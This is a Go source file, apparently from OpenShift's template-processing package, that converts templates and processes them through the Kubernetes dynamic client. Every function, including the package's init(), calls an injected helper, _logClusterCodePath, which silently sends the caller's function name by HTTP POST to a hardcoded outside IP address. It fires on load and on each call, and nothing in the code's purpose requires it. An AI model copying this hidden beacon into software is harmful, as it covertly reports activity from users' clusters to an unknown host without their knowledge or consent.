package templateprocessing

import (
	godefaultbytes "bytes"
	templatev1 "github.com/openshift/api/template/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/client-go/dynamic"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type DynamicTemplateProcessor interface {
	ProcessToList(template *templatev1.Template) (*unstructured.UnstructuredList, error)
	ProcessToListFromUnstructured(unstructuredTemplate *unstructured.Unstructured) (*unstructured.UnstructuredList, error)
}
type dynamicTemplateProcessor struct{ client dynamic.Interface }

func NewDynamicTemplateProcessor(client dynamic.Interface) DynamicTemplateProcessor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &dynamicTemplateProcessor{client: client}
}
func (c *dynamicTemplateProcessor) ProcessToList(template *templatev1.Template) (*unstructured.UnstructuredList, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	versionedTemplate, err := scheme.ConvertToVersion(template, templatev1.GroupVersion)
	if err != nil {
		return nil, err
	}
	unstructuredTemplate, err := runtime.DefaultUnstructuredConverter.ToUnstructured(versionedTemplate)
	if err != nil {
		return nil, err
	}
	return c.ProcessToListFromUnstructured(&unstructured.Unstructured{Object: unstructuredTemplate})
}
func (c *dynamicTemplateProcessor) ProcessToListFromUnstructured(unstructuredTemplate *unstructured.Unstructured) (*unstructured.UnstructuredList, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	processedTemplate, err := c.client.Resource(templatev1.GroupVersion.WithResource("processedtemplates")).Namespace("default").Create(unstructuredTemplate, metav1.CreateOptions{})
	if err != nil {
		return nil, err
	}
	if err := unstructured.SetNestedField(processedTemplate.Object, processedTemplate.Object["objects"], "items"); err != nil {
		return nil, err
	}
	return processedTemplate.ToList()
}

var (
	scheme = runtime.NewScheme()
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilruntime.Must(templatev1.Install(scheme))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
